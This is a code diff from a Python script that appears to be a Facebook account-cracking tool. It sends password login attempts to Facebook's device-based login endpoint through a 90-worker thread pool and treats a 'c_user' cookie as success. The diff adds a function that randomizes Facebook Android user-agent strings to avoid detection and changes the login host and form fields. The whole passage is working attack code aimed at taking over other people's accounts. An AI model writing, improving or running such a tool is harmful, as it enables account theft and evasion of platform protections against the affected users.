@@ -185,6 +185,37 @@ def sexy():
 with ThreadPool(max_workers=90) as jjj:
     jjj.submit(sexy)
 
+# Define lists of possible values for different components of the user-agent string
+devices = ["Samsung", "Vivo"]
+models = ["SM-S911B", "Vivo Y100"]
+screen_density = [2.0, 3.0]
+screen_width = [360, 1080]
+screen_height = [640, 2165]
+app_versions = ["493.0.0.72.158", "492.0.0.127.80"]
+facebook_versions = ["523162194", "523162193", "523162192", "523162191"]
+languages = ["hi_IN", "en_IN", "ta_IN", "te_IN", "bn_IN", "mr_IN", "gu_IN", "ml_IN"]
+networks = ["Airtel", "Jio", "Vi", "BSNL", "MTNL"]
+arch = ["arm64-v8a", "armeabi-v7a", "x86_64", "armv9"]
+def generate_random_user_agent():
+    device = random.choice(devices)
+    model = random.choice(models)
+    density = random.choice(screen_density)
+    width = random.choice(screen_width)
+    height = random.choice(screen_height)
+    app_version = random.choice(app_versions)
+    fb_version = random.choice(facebook_versions)
+    language = random.choice(languages)
+    network = random.choice(networks)
+    architecture = random.choice(arch)
+    user_agent = (
+        f"FBAN/FB4A;FBAV/{app_version};FBBV/{fb_version};"
+        f"FBDM/{{density={density},width={width},height={height}}};"
+        f"FBLC/{language};FBRV/526139383;FBCR/{network};"
+        f"FBMF/{device};FBBD/{device};FBPN/com.facebook.katana;"
+        f"FBDV/{model};FBSV/13;FBOP/1;FBCA/{architecture}:;"
+    )
+    return user_agent
+
 
 red = "\033[1;31m"
 green = "\033[1;32m"
@@ -1714,23 +1745,13 @@ def d(uid,pwx,tl):
             "had_password_prefilled": False,
             "is_smart_lock": False,
             "bi_xrwh": 0,
-            "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
-            "bi_wvdp": "",
-            "fb_dtsg": "",
-            "jazoest": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "dyn": "",
-            "csr": "",
-            "req": 3,
-            "fmt": 0,
-            "a": "",
-            "user": 0}
+            "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             headers =  {
-            'user-agent': '[FBAN/FB4A;FBAV/392.0.0.28.53;FBPN/com.facebook.katana;FBLC/bn_IN;FBBV/3723264;FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/2312DRAABG;FBSV/8;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1',
+            'user-agent': generate_random_user_agent(),
             'Accept-Encoding': 'gzip, deflate',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'Connection': 'keep-alive',
-            'Host': 'www.facebook.com',
+            'Host': 'web.facebook.com',
             'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
             'cache-control': 'max-age=0',
             'dpr': '3',
@@ -1740,9 +1761,8 @@ def d(uid,pwx,tl):
             'sec-fetch-site': 'cross-site',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'viewport-width': '980'}
-            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100'
+            'viewport-width': '400'}
+            url = 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100'
             po = Session.post(url, data=data, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
